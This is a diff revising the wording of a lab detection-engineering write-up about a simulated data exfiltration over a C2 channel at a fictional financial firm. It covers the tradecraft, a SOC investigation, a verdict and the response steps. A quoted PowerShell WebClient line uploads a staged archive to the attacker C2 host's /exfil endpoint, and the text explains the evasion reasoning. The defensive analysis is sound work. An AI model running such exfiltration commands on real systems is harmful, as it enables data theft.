@@ -21,17 +21,17 @@
 
 ### Tradecraft
 
-**What:** The final stage of a data breach — exfiltrating collected data over an established C2 channel. The attacker:
+**What:** Upload of the collected archive over the C2 channel that was already open. The attacker:
 1. Established C2 connectivity (AGC-051/055/056)
 2. Collected and archived sensitive documents (AGC-057)
-3. Now uploads the archive to an external server controlled by the attacker
+3. Uploads the archive to the attacker-controlled server
 
 **Why an Attacker Uses It Here:**
-- HTTPS encryption conceals the payload content from network inspection without TLS interception
-- Reusing the existing C2 channel (10.10.40.10) avoids establishing new suspicious connections
+- HTTPS hides the payload from any network inspection that lacks TLS interception
+- Reusing the C2 host at 10.10.40.10 means no new destination appears in the flow logs
 - POST method with `-InFile` sends the archive in a single request
-- Multiple exfiltration methods (Invoke-WebRequest, WebClient) provide fallback if one fails
-- At a financial services firm like Ashford Grove Capital, the exfiltrated data (revenue reports, client PII, wire transfer logs, M&A documents) triggers mandatory breach notification requirements
+- Falling back from Invoke-WebRequest to WebClient means one parsing failure does not stop the upload
+- At Ashford Grove Capital the stolen data (revenue reports, client PII, wire transfer logs, M&A documents) triggers mandatory breach notification
 
 ### Simulation
 
@@ -60,7 +60,7 @@ $wc.UploadFile("https://10.10.40.10:443/exfil", "C:\Windows\Temp\staged.zip")
 - Method 1 (HTTPS POST): Connection established on port 443, IE parsing error (UseBasicParsing not specified) but TCP connection completed
 - Method 2 (HTTP POST): Connection established on port 80, same IE parsing error
 - Method 3 (WebClient HTTPS): Upload succeeded — HTTP 200 response received with HTML redirect body
-- All 3 connections captured by Sysmon EID 3 with same ProcessGuid
+- Sysmon EID 3 captured all 3 connections under the same ProcessGuid
 
 ## SOC Perspective
 
@@ -125,7 +125,7 @@ User: COMPROMISED-01\Administrator
 ### Investigation
 
 **Step 1 — ProcessGuid correlation across all 3 connections:**
-All 3 EID 3 events share the same ProcessGuid `{eb65e329-ca5e-6aa9-ad04-000000001400}`, which matches the EID 1 process creation for powershell.exe (PID 4336). This proves a single PowerShell process made all 3 upload attempts — a coordinated exfiltration operation, not separate incidents.
+All 3 EID 3 events share ProcessGuid `{eb65e329-ca5e-6aa9-ad04-000000001400}`, the same GUID Sysmon EID 1 logged for powershell.exe (PID 4336). One PowerShell process made all 3 upload attempts; this is one operation, not three incidents.
 
 **Step 2 — Connection timing analysis:**
 ```
@@ -133,33 +133,33 @@ All 3 EID 3 events share the same ProcessGuid `{eb65e329-ca5e-6aa9-ad04-00000000
 22:44:51.155  HTTP POST  to :80  (port 64861)  -- 2.5s later
 22:44:53.182  HTTPS WebClient to :443 (port 64862)  -- 2.0s later
 ```
-Three connections within 5 seconds to the same external IP using incrementing source ports = automated exfiltration script with multiple fallback methods. The port 80 fallback attempt between two HTTPS attempts indicates the script tried HTTP when HTTPS encountered issues.
+Three connections within 5 seconds to one external IP, on consecutive source ports, is a script with fallback methods, not a person typing. The port 80 attempt sits between the two HTTPS attempts, so the script dropped to HTTP when the first HTTPS request failed.
 
 **Step 3 — Correlation with C2 beacon history (AGC-051/055/056):**
-10.10.40.10 is the established C2 server from AGC-051 (DNS beacon), AGC-055 (PowerShell outbound), and AGC-056 (C2 process tree). These upload connections represent the exfiltration phase over the same C2 channel:
+10.10.40.10 is the C2 server from AGC-051 (DNS beacon), AGC-055 (PowerShell outbound), and AGC-056 (C2 process tree). The uploads ride the same channel:
 - Beacon establishment (AGC-051): DNS queries to attacker-controlled server
 - C2 communication (AGC-055/056): PowerShell HTTPS beacons to 10.10.40.10
 - Data collection (AGC-057): Finance documents archived to staged.zip
 - **Data exfiltration (AGC-062): staged.zip uploaded to 10.10.40.10**
 
 **Step 4 — Volume anomaly assessment:**
-While Sysmon EID 3 does not record bytes transferred, the 3 rapid POST connections from PowerShell to an external IP with `-InFile` (file upload) represent a volume anomaly compared to typical beacon traffic (small periodic callbacks). Network flow logs (conn.log) or firewall logs would show orig_bytes significantly elevated during this window.
+Sysmon EID 3 does not record bytes transferred. Still, 3 rapid POST connections from PowerShell with `-InFile` (file upload) look nothing like the small periodic callbacks of beacon traffic. Network flow logs (conn.log) or firewall logs would show orig_bytes spike during this window.
 
 **Step 5 — FP twin exclusion (AGC-086):**
-AGC-086 covers the legitimate regulatory submission scenario — a similar large HTTPS upload but to an authorized regulatory portal. Key differentiators:
+AGC-086 is the benign twin: a large HTTPS upload, but to an authorized regulatory portal. What separates this case:
 - This upload targets 10.10.40.10 (known C2, not a regulatory endpoint)
-- No business justification or regulatory filing window
-- Preceded by unauthorized collection activity (AGC-057-061)
-- FP exclusion confirmed: this is not a regulatory submission
+- No filing window or business justification exists for the upload
+- The upload follows the unauthorized collection activity (AGC-057-061)
+- Regulatory submission ruled out
 
 ### Report
 
 **Verdict: True Positive** — Confirmed data exfiltration over established C2 channel.
 
-**Confidence: Critical** — The highest severity:
+**Confidence: Critical** — supported by:
 1. **Confirmed exfiltration** — WebClient upload succeeded (HTTP 200), data reached the attacker's server
-2. **ProcessGuid chain** links the upload process directly to the C2 beacon infrastructure
-3. **3 upload attempts** (HTTPS, HTTP, WebClient HTTPS) demonstrate determined exfiltration with fallback methods
+2. **ProcessGuid chain** ties the upload process to the C2 beacon infrastructure
+3. **3 upload attempts** (HTTPS, HTTP, WebClient HTTPS) show the script kept trying until one method worked
 4. **Full attack chain closed**: C2 establishment -> collection -> staging -> exfiltration
 5. **Financial data** — at Ashford Grove Capital, this triggers mandatory breach notification requirements
 
@@ -167,11 +167,11 @@ AGC-086 covers the legitimate regulatory submission scenario — a similar large
 
 **Response recommendation:**
 1. **IMMEDIATELY block 10.10.40.10** at the perimeter firewall (OPNsense) — all protocols, all ports
-2. **Isolate COMPROMISED-HOST-01** from the network — the attacker has active C2 and has successfully exfiltrated data
-3. **Determine breach scope** — correlate the staged.zip contents with AGC-057 (bulk archive) to identify exactly which documents were exfiltrated
-4. **Initiate breach notification process** — financial services regulatory requirements mandate disclosure within specific timeframes for client PII, financial records, and M&A documents
+2. **Isolate COMPROMISED-HOST-01** from the network — the C2 channel is live and one upload already succeeded
+3. **Determine breach scope** — compare the staged.zip contents with the AGC-057 bulk archive to list exactly which documents left
+4. **Initiate breach notification process** — client PII, financial records, and M&A documents all carry regulatory disclosure deadlines
 5. **Preserve forensic evidence** — snapshot COMPROMISED-HOST-01 before remediation; preserve Sysmon logs, network flow logs, and firewall logs
-6. **Hunt for additional exfiltration** — search for other large outbound connections to 10.10.40.10 across all endpoints in the environment
+6. **Hunt for additional exfiltration** — search for other large outbound connections to 10.10.40.10 across every other endpoint in the lab
 
 ### MITRE Mapping
 
